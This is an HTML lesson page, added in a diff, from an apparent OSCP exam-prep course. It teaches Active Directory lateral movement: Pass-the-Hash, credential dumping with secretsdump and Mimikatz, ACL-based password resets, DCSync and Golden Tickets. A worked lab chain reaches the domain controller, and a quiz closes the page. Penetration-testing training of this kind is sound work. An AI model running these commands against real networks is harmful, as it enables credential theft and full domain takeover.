@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Lesson 12 · Active Directory: Lateral Movement to Domain Admin</title>
+<link rel="stylesheet" href="../assets/lesson.css">
+</head>
+<body>
+
+<nav class="crumbs">OSCP Course · <a href="../reference/links.html">Links</a> · <a href="./0011-active-directory-authentication-attacks.html">Lesson 11</a> · <strong>Lesson 12</strong> · <a href="../reference/active-directory.html">Active Directory</a> · <a href="../reference/glossary.html">Glossary</a></nav>
+
+<span class="kicker">Lesson 12 · Active Directory</span>
+<h1>Active Directory: Lateral Movement to Domain Admin</h1>
+<p class="meta">Mission: pass the OSCP+ exam · Your win today: turn a credential or hash into movement across hosts and, finally, Domain Admin + the DC.</p>
+
+<p class="lead">Lesson 11 ended with loot: a cracked password, an NTLM hash, maybe a Kerberos ticket. This is the climax of the AD block — the 40-point set lives or dies here. The shape is a loop you already understand as an engineer: <strong>use a credential to execute on a host, harvest more credentials from it, re-enumerate as the new identity, and move again</strong> — until one hop lands you the krbtgt hash and you own the entire domain. No new clever exploit. Just disciplined reuse.</p>
+
+<div class="box mantra">
+The domain falls one credential at a time.
+</div>
+
+<h2>What you hold, and what it unlocks</h2>
+<p>AD lateral movement is credential plumbing. The first thing to know is that <strong>you rarely need to crack a hash to use it</strong> — Windows authentication will happily accept the hash, the ticket, or the key directly. Know what each kind of material buys you:</p>
+<table>
+<thead><tr><th>Material</th><th>How you got it</th><th>What it unlocks</th></tr></thead>
+<tbody>
+<tr><td><strong>Plaintext password</strong></td><td>Cracked, sprayed, config file, LSASS</td><td>Everything — auth to SMB/WinRM/RDP/LDAP as that user</td></tr>
+<tr><td><strong>NTLM hash</strong></td><td><code>secretsdump</code>, SAM, LSASS</td><td><strong>Pass-the-Hash</strong> — authenticate without ever cracking it</td></tr>
+<tr><td><strong>Kerberos TGT/TGS</strong></td><td>Stolen from memory, forged</td><td><strong>Pass-the-Ticket</strong> — reuse a ticket; Golden/Silver tickets</td></tr>
+<tr><td><strong>AES128/256 key</strong></td><td><code>secretsdump</code>, LSASS</td><td>Overpass-the-Hash — request Kerberos tickets; survives NTLM hardening</td></tr>
+</tbody>
+</table>
+<p>Think of this as a <strong>credential pool</strong>. Every host you own refills it. The whole game is converting pool entries into access, and access into a bigger pool, until a Domain Admin or the krbtgt account lands in your hands.</p>
+
+<h2>Execute remotely — turn a credential into a shell</h2>
+<p>A valid credential is only potential energy until you run code with it. These are the OSCP-standard tools. The two columns that matter: <strong>what protocol</strong> they ride and <strong>whether they need local-admin</strong> on the target or just any valid domain credential.</p>
+<table>
+<thead><tr><th>Tool</th><th>Port / proto</th><th>Needs</th><th>Notes</th></tr></thead>
+<tbody>
+<tr><td><code>psexec.py</code></td><td>445 / SMB</td><td>Local admin</td><td>SYSTEM shell; drops a service — noisy but reliable</td></tr>
+<tr><td><code>wmiexec.py</code></td><td>445+135 / WMI</td><td>Local admin</td><td>Semi-interactive, fileless-ish; quieter than psexec</td></tr>
+<tr><td><code>smbexec.py</code></td><td>445 / SMB</td><td>Local admin</td><td>Service-based shell, no binary dropped to disk</td></tr>
+<tr><td><code>atexec.py</code></td><td>445 / Task Sched</td><td>Local admin</td><td>Runs a single command via a scheduled task</td></tr>
+<tr><td><code>evil-winrm</code></td><td>5985 / WinRM</td><td>Remote Mgmt Users</td><td>Best interactive shell when WinRM is open</td></tr>
+<tr><td><code>nxc</code> (NetExec)</td><td>445 / SMB</td><td>Valid creds (exec needs admin)</td><td>Sweep + execute at scale; flags <code>Pwn3d!</code></td></tr>
+<tr><td><code>xfreerdp</code></td><td>3389 / RDP</td><td>Valid creds</td><td>GUI when you need a desktop or a tool won't run headless</td></tr>
+</tbody>
+</table>
+
+<p>The Impacket <code>*exec.py</code> family all take the same <code>domain/user:password@target</code> form:</p>
+<pre><span class="p">$</span> <span class="o">wmiexec.py corp.local/svc_sql:Password123!@10.10.10.20</span>
+<span class="o">[*] SMBv3.0 dialect used</span>
+<span class="o">[!] Launching semi-interactive shell - Careful with output</span>
+<span class="p">C:\&gt;</span> <span class="o">whoami</span>
+<span class="h">nt authority\system</span></pre>
+
+<p>WinRM, when it's open (5985), gives the nicest shell:</p>
+<pre><span class="p">$</span> <span class="o">evil-winrm -i 10.10.10.20 -u svc_sql -p 'Password123!'</span>
+<span class="p">*Evil-WinRM*</span> <span class="o">PS C:\Users\svc_sql\Documents&gt; whoami</span>
+<span class="h">corp\svc_sql</span></pre>
+
+<p>And NetExec runs a command across a whole subnet in one line — perfect for finding where a credential works:</p>
+<pre><span class="p">$</span> <span class="o">nxc smb 10.10.10.0/24 -u svc_sql -p 'Password123!' -x 'whoami'</span></pre>
+
+<div class="box note">
+<span class="box-title">Local admin vs. just a credential</span>
+A domain account can <em>authenticate</em> to almost everything, but you can only <strong>execute code</strong> where it's a local administrator (or in Remote Management Users, for WinRM). So step one after grabbing any credential is to ask: <em>where is this account privileged?</em> — and NetExec answers it in seconds.
+</div>
+
+<h2>Pass-the-Hash — the hash is the password</h2>
+<p>This is the single most important reuse trick in AD. NTLM authentication never sends the plaintext; it proves knowledge of the <strong>NT hash</strong>. So if you have the hash, you have everything the password would give you — <strong>no cracking required</strong>. Every movement tool accepts a hash in place of the password:</p>
+<pre><span class="c"># NetExec — spray a hash across the subnet, see where it's admin</span>
+<span class="p">$</span> <span class="o">nxc smb 10.10.10.0/24 -u Administrator -H 2b576acbe6bcfda7294d6bd18041b8fe</span>
+<span class="h">SMB  10.10.10.20  445  HOST20  [+] CORP\Administrator (Pwn3d!)</span>
+
+<span class="c"># evil-winrm with a hash instead of a password</span>
+<span class="p">$</span> <span class="o">evil-winrm -i 10.10.10.20 -u Administrator -H 2b576acbe6bcfda7294d6bd18041b8fe</span>
+
+<span class="c"># Impacket — note the leading colon: empty LM, then the NT hash</span>
+<span class="p">$</span> <span class="o">psexec.py -hashes :2b576acbe6bcfda7294d6bd18041b8fe corp.local/Administrator@10.10.10.20</span></pre>
+<p>That <code>:hash</code> syntax is <code>LMHASH:NTHASH</code> — you almost always leave LM empty and pass only the 32-hex NT half. Internalise this: <strong>a dumped hash is a working credential.</strong></p>
+
+<h2>Harvest more — refill the credential pool</h2>
+<p>Once you have local admin (often SYSTEM) on a host, loot it for credentials of <em>other</em> users — especially anyone more privileged who has logged in there. This is what turns one foothold into domain-wide movement.</p>
+
+<h3>Remotely, with Impacket secretsdump</h3>
+<p><code>secretsdump.py</code> is the workhorse. With local-admin creds it remotely pulls the local SAM, LSA secrets, and cached domain credentials — without touching disk or dropping a tool:</p>
+<pre><span class="p">$</span> <span class="o">impacket-secretsdump 'corp.local/svc_sql:Password123!@10.10.10.20'</span>
+<span class="o">[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)</span>
+<span class="o">Administrator:500:aad3b...:</span><span class="h">9a3e1c... </span><span class="o">:::</span>
+<span class="o">[*] Dumping cached domain logon information (domain/user:hash)</span>
+<span class="o">CORP.LOCAL/jdoe_da:$DCC2$10240#jdoe_da#...</span>
+<span class="o">[*] Dumping LSA Secrets</span>
+<span class="o">CORP\svc_backup:</span><span class="h">Backup#2023!</span></pre>
+<p>You can feed it a hash the same way (<code>-hashes :nthash</code>). SAM gives you local-account NT hashes (great for Pass-the-Hash to <em>other</em> boxes with the same local admin); LSA secrets often leak service-account plaintext; cached creds are domain hashes for users who logged in here.</p>
+
+<h3>On the host, with Mimikatz</h3>
+<p>When you have an interactive shell and want what's live in memory, Mimikatz reads it straight out of LSASS:</p>
+<pre><span class="p">PS&gt;</span> <span class="o">.\mimikatz.exe</span>
+<span class="p">mimikatz #</span> <span class="o">privilege::debug</span>
+<span class="p">mimikatz #</span> <span class="o">sekurlsa::logonpasswords</span>     <span class="c"># NT hashes + sometimes plaintext of logged-in users</span>
+<span class="p">mimikatz #</span> <span class="o">lsadump::sam</span>                  <span class="c"># local SAM hashes</span>
+<span class="o">    User : Administrator</span>
+<span class="o">    NTLM : </span><span class="h">2b576acbe6bcfda7294d6bd18041b8fe</span></pre>
+<p>Other sources to keep in mind: a raw <strong>LSASS dump</strong> (via <code>procdump</code>, Task Manager, or comsvcs.dll) carried offline to your own Mimikatz; <strong>DPAPI</strong>-protected secrets (saved RDP/browser creds, vaults); and the <strong>cached domain credentials</strong> above. Each entry you recover goes back into the pool — and every fresh identity is a reason to re-run enumeration.</p>
+
+<div class="box tip">
+<span class="box-title">Re-enumerate as each new identity</span>
+A new credential can have ACLs and group memberships your last one didn't. After every harvest, re-run BloodHound (or at least <code>nxc</code> against the subnet) <em>as the new user</em>. The shortest path to Domain Admin often only appears once you're standing on the right account.
+</div>
+
+<h2>The paths to Domain Admin</h2>
+<p>Movement is the means; the goal is a Domain Admin or the DC. Four paths cover almost every OSCP-style AD set. Try them roughly in this order of likelihood:</p>
+<table>
+<thead><tr><th>Path</th><th>What you need</th><th>The move</th></tr></thead>
+<tbody>
+<tr><td><strong>Local-admin reuse</strong></td><td>An account that's admin somewhere</td><td>Find it, loot the host, repeat with the new creds</td></tr>
+<tr><td><strong>ACL abuse</strong></td><td>A dangerous right (BloodHound)</td><td>Reset a password / add yourself to a group</td></tr>
+<tr><td><strong>DCSync</strong></td><td>Replication rights on the domain</td><td>Dump krbtgt + every hash from the DC</td></tr>
+<tr><td><strong>Golden Ticket</strong></td><td>The krbtgt hash (post-DA)</td><td>Forge TGTs for persistence — own the domain forever</td></tr>
+</tbody>
+</table>
+
+<h3>Local-admin reuse</h3>
+<p>The bread-and-butter loop. Spray a credential across the subnet and read the <code>Pwn3d!</code> flags — that word means <strong>this account is a local administrator here</strong>, i.e. you can execute and dump:</p>
+<pre><span class="p">$</span> <span class="o">nxc smb 10.10.10.0/24 -u svc_sql -p 'Password123!'</span>
+<span class="o">SMB  10.10.10.20  445  HOST20  [+] CORP\svc_sql </span><span class="h">(Pwn3d!)</span>
+<span class="o">SMB  10.10.10.21  445  HOST21  [+] CORP\svc_sql</span>
+<span class="o">SMB  10.10.10.22  445  HOST22  [+] CORP\svc_sql </span><span class="h">(Pwn3d!)</span></pre>
+<p>HOST20 and HOST22 say <code>Pwn3d!</code> — loot both. HOST21 authenticated but isn't admin there, so move on. Reused local-admin passwords (the same image cloned across machines) are a classic, and each new host can yield a more privileged user's hash.</p>
+
+<h3>ACL abuse — let BloodHound find the shortcut</h3>
+<p>From Lesson 11 you have BloodHound data. Its <strong>shortest-path-to-Domain-Admins</strong> query exposes object permissions you can abuse without ever being admin on a box. The edges to look for:</p>
+<table>
+<thead><tr><th>Edge</th><th>What it lets you do</th></tr></thead>
+<tbody>
+<tr><td><code>GenericAll</code> / <code>GenericWrite</code></td><td>Full/partial control — reset a password, set an SPN, add a member</td></tr>
+<tr><td><code>WriteDACL</code> / <code>Owns</code></td><td>Grant yourself further rights, then abuse them (e.g. DCSync)</td></tr>
+<tr><td><code>ForceChangePassword</code></td><td>Reset a target user's password to one you choose</td></tr>
+<tr><td><code>AddMember</code></td><td>Add yourself (or a controlled user) to a privileged group</td></tr>
+</tbody>
+</table>
+<p>BloodHound's edge help spells out the exact abuse for each. The tooling, at a high level: <code>net rpc</code> and <code>bloodyAD</code> for group/password changes, <code>pywhisker</code> for shadow-credential attacks, <code>dacledit.py</code> for rewriting ACLs. Example — you hold <code>ForceChangePassword</code> over <code>jdoe_da</code>:</p>
+<pre><span class="p">$</span> <span class="o">net rpc password jdoe_da 'NewPass#2024' -U corp.local/svc_sql%'Password123!' -S dc01</span>
+<span class="p">$</span> <span class="o">nxc smb 10.10.10.10 -u jdoe_da -p 'NewPass#2024'</span>
+<span class="h">SMB  10.10.10.10  445  DC01  [+] CORP\jdoe_da (Pwn3d!)</span></pre>
+
+<h3>DCSync — impersonate a domain controller</h3>
+<p>If your identity holds the <strong>Replicating Directory Changes</strong> rights (Domain Admins have them; ACL abuse can grant them), you can ask the DC to replicate secrets to you — exactly as a real DC would. That hands you every hash in the domain, including <strong>krbtgt</strong> and the built-in Administrator:</p>
+<pre><span class="p">$</span> <span class="o">impacket-secretsdump -just-dc 'corp.local/jdoe_da:NewPass#2024@10.10.10.10'</span>
+<span class="o">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span>
+<span class="o">krbtgt:502:aad3b...:</span><span class="h">f3bc1e4a...c9</span><span class="o">:::</span>
+<span class="o">Administrator:500:aad3b...:</span><span class="h">2b576acbe6bcfda7294d6bd18041b8fe</span><span class="o">:::</span>
+<span class="o">CORP\jsmith:1104:aad3b...:5e9d3f...:::</span></pre>
+<p>That Administrator NT hash is the keys to the kingdom — Pass-the-Hash it to the DC and you're done. <strong>DCSync owning the domain is the 40-point payoff.</strong></p>
+
+<h3>Golden Ticket — persistence after you win</h3>
+<p>The krbtgt hash signs every Kerberos TGT in the domain. With it you can <strong>forge a Golden Ticket</strong>: a TGT for any user (even non-existent ones) with arbitrary group membership, valid until krbtgt is rotated twice. On OSCP this is persistence/insurance once you already have DA — note it, but DCSync is your actual objective.</p>
+
+<h2>The loop, made explicit</h2>
+<p>Every AD compromise is this cycle. Run it until you hit the DC:</p>
+<ol class="steps">
+<li><strong>Own a host</strong> — use a credential (password/hash/ticket) to execute where you're local admin.</li>
+<li><strong>Dump credentials</strong> — <code>secretsdump</code> / Mimikatz to pull SAM, LSA, cached, and live hashes.</li>
+<li><strong>Re-enumerate</strong> — re-run BloodHound and <code>nxc</code> <em>as each new identity</em>; the new account opens new paths.</li>
+<li><strong>Move</strong> — Pass-the-Hash / Pass-the-Ticket to the next host the new credential unlocks.</li>
+<li><strong>Repeat</strong> until an identity has DCSync rights → dump the DC → Domain Admin.</li>
+</ol>
+
+<div class="box warn">
+<span class="box-title">Document the whole chain as you go</span>
+The exam scores AD <em>partially</em> — a clean, reproducible path from first foothold to DC earns points even if you stall midway. So log <strong>every hop</strong>: the credential used, the host, the command, the output that proved it, the new loot. Screenshot each <code>whoami</code> and each proof file. If your report can't reconstruct the path, the points evaporate — and a messy chain is impossible to retrace under time pressure.
+</div>
+
+<h2>Worked example — foothold to DC in three hops</h2>
+<p>You cracked <code>svc_sql</code> in Lesson 11. NetExec showed it's local admin on HOST20 (<code>Pwn3d!</code>). Hop 1 — loot HOST20:</p>
+<pre><span class="p">$</span> <span class="o">impacket-secretsdump 'corp.local/svc_sql:Password123!@10.10.10.20'</span>
+<span class="o">[*] Dumping cached domain logon information</span>
+<span class="o">[*] Dumping LSA Secrets</span>
+<span class="o">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span>
+<span class="o">CORP\jdoe_da:::</span><span class="h">2b576acbe6bcfda7294d6bd18041b8fe</span><span class="o">:::</span>
+<span class="c"># jdoe_da logged into HOST20 — their NT hash is now ours</span></pre>
+<p>Hop 2 — check what <code>jdoe_da</code> unlocks. It's a Domain Admin, so it's <code>Pwn3d!</code> on the DC. Pass-the-Hash straight to the DC — <em>no cracking</em>:</p>
+<pre><span class="p">$</span> <span class="o">nxc smb 10.10.10.10 -u jdoe_da -H 2b576acbe6bcfda7294d6bd18041b8fe</span>
+<span class="h">SMB  10.10.10.10  445  DC01  [+] CORP\jdoe_da (Pwn3d!)</span>
+
+<span class="p">$</span> <span class="o">evil-winrm -i 10.10.10.10 -u Administrator -H 2b576acbe6bcfda7294d6bd18041b8fe</span>
+<span class="p">*Evil-WinRM*</span> <span class="o">PS C:\Users\Administrator&gt; whoami</span>
+<span class="h">corp\administrator</span>
+<span class="p">*Evil-WinRM*</span> <span class="o">PS C:\Users\Administrator&gt; type C:\Users\Administrator\Desktop\proof.txt</span>
+<span class="h">7f3c9a1e44b0d2e8c6a5f0b1d9e3c2a4</span></pre>
+<p>Hop 3 — make it official with DCSync so the report has the krbtgt and full hash dump:</p>
+<pre><span class="p">$</span> <span class="o">impacket-secretsdump -just-dc 'corp.local/Administrator@10.10.10.10' -hashes :2b576acbe6bcfda7294d6bd18041b8fe</span>
+<span class="o">krbtgt:502:aad3b...:</span><span class="h">f3bc1e4a...c9</span><span class="o">:::</span></pre>
+<p>Domain owned. One cracked service account became SYSTEM on a member host, then a Domain Admin's hash, then the DC and the krbtgt — and you never cracked a thing after the first. That's the 40-point set, and the path is exactly what your report reconstructs.</p>
+
+<h2>Check yourself</h2>
+<p>Pick the best move. Retrieve before you reason — feedback appears under each.</p>
+<div class="quiz" id="quiz"></div>
+
+<div class="primary">
+<span class="box-title">▶ Primary source — your AD movement bible</span>
+The <a href="https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html">HackTricks Active Directory methodology</a> is the page to keep open during the exam — it chains every technique here with copy-paste commands. Pair it with the <a href="https://github.com/fortra/impacket">Impacket suite</a> (psexec/wmiexec/secretsdump are all here) and BloodHound's built-in edge help for the exact abuse of each ACL.<sup class="ref"><a href="#s1">1</a></sup>
+</div>
+
+<div class="box tip">
+<span class="box-title">Do this before Lesson 13</span>
+Complete one full AD chain in a lab — an HTB AD-style box (TJ Null's list) or a small home AD lab — from initial foothold all the way to Domain Admin and the DC. Document <em>every</em> hop: credential, host, command, proof. Owning a domain end to end, with a path you could hand to a colleague, is the 40-point exam set in miniature.
+</div>
+
+<div class="box note">
+<span class="box-title">Practice these boxes</span>
+<strong>Move to Domain Admin:</strong> <strong>Forest</strong> (WriteDacl → DCSync) — HTB · AD · Easy; <strong>Resolute</strong> (DnsAdmins) &amp; <strong>Cascade</strong> (HTB · Med); <strong>Blackfield</strong> (Hard) for SeBackup → NTDS. <a href="../reference/practice-boxes.html#pb-12">→ Full box map for this lesson</a>.
+</div>
+
+<div class="teacher">
+<span class="box-title">I'm your teacher — ask me anything</span>
+Stuck on a hop? Paste me your <code>nxc</code> sweep, your BloodHound path, or a <code>secretsdump</code> output and we'll find the next move together. Next: <strong>Lesson 13 — Pivoting &amp; Tunneling</strong> — when the DC and the juicy hosts aren't directly reachable, you route through the machine you already own.
+</div>
+
+<h2>Sources</h2>
+<ol class="sources">
+<li id="s1"><a href="https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html">HackTricks — Active Directory Methodology</a> (lateral movement, Pass-the-Hash/Ticket, DCSync) · <a href="https://github.com/fortra/impacket">Fortra — Impacket</a> (psexec/wmiexec/smbexec/atexec/secretsdump) · <a href="https://bloodhound.readthedocs.io/">BloodHound edge help</a> (ACL abuse). Local commands: <a href="../reference/active-directory.html">Active Directory cheatsheet</a>.</li>
+</ol>
+
+<footer>
+<span><a href="./0011-active-directory-authentication-attacks.html">← Lesson 11: Active Directory: Authentication Attacks</a></span>
+<span><a href="./0013-pivoting-and-tunneling.html">Next → Lesson 13: Pivoting &amp; Tunneling</a></span>
+</footer>
+
+<script src="../assets/quiz.js"></script>
+<script>
+renderQuiz('quiz', [
+  {
+    prompt: "You dumped an Administrator NT hash but couldn't crack it. Can you still use it to log into another host?",
+    options: ["No — you must crack it to a plaintext first", "Yes — Pass-the-Hash; the hash authenticates directly", "Only if the account has no password set", "Only over RDP, never over SMB or WinRM"],
+    answer: 1,
+    explain: "NTLM auth proves knowledge of the hash, not the plaintext — so the hash IS a usable credential. Cracking is rarely needed."
+  },
+  {
+    prompt: "You have local-admin creds on a member host and want every other user's credentials cached on it. Best tool?",
+    options: ["BloodHound's collector", "A Kerberoast against the DC", "impacket-secretsdump against the host", "An Nmap version scan"],
+    answer: 2,
+    explain: "secretsdump remotely pulls SAM, LSA secrets, and cached domain creds with local-admin rights — the standard harvest step."
+  },
+  {
+    prompt: "Which condition lets you DCSync, and what does it hand you?",
+    options: ["Replication rights → dumps krbtgt and every domain hash", "Any valid domain user → dumps only your own hash", "Local admin on one host → dumps that host's SAM", "RDP access to the DC → dumps the event logs"],
+    answer: 0,
+    explain: "With Replicating Directory Changes rights you impersonate a DC and pull all secrets, including krbtgt — full domain compromise."
+  },
+  {
+    prompt: "A NetExec SMB sweep shows 'Pwn3d!' next to one host. What does that tell you?",
+    options: ["The host is offline or unreachable", "The credential is expired on that host", "SMB signing is enforced there", "Your account is local admin on that host"],
+    answer: 3,
+    explain: "'Pwn3d!' means the supplied credential has local-administrator rights there — you can execute code and dump credentials."
+  },
+  {
+    prompt: "You're moving host to host in the AD set. Why obsessively log every credential, host, and command?",
+    options: ["The exam scores the chain partially and the report must reproduce it", "It speeds up the secretsdump command itself", "It is required to bypass SMB signing", "It automatically forges a Golden Ticket"],
+    answer: 0,
+    explain: "AD points are awarded for a clear, reproducible path from foothold to DC — an undocumented chain earns nothing and can't be retraced."
+  },
+  {
+    prompt: "You just dumped a new user's hash from a host you own. What's the correct next step in the loop?",
+    options: ["Immediately attempt a kernel exploit on the DC", "Re-enumerate as the new identity, then move to what it unlocks", "Reboot the host to clear your tracks", "Crack the hash before doing anything else"],
+    answer: 1,
+    explain: "Own → dump → re-enumerate as the new identity → move. A fresh credential opens paths your old one couldn't see."
+  }
+]);
+</script>
+
+</body>
+</html>
